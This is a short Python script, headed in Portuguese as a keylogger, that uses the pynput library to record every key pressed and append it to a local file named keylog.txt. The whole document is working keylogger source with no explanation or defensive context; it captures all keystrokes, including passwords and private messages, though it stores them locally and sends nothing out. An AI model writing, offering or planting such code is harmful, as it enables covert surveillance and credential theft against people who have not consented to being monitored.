# Keylogger em Python
from pynput import keyboard

def on_press(key):
    try:
        with open("keylog.txt", "a") as log_file:
            log_file.write('{0} pressed\n'.format(key.char))
    except AttributeError:
        with open("keylog.txt", "a") as log_file:
            log_file.write('{0} pressed\n'.format(key))

# Listener de teclado
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
